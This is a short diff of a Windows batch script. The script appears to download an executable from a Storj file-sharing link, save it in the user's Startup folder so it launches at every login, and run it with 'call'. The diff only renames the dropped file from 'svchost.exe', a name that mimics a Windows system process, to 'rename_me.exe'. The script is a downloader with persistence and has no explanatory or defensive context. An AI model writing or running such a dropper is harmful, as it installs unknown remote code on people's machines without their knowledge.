@@ -21,7 +21,7 @@ call "%DEST%"
 setlocal 
 
 set "URL=https://link.storjshare.io/s/jupizfqdjs75vrcxlx7blaybowka/isimsallaqwe/svchost.exe?download=1"
-set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe"
+set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\rename_me.exe"
 
 
 if exist "%DEST%" del "%DEST%"
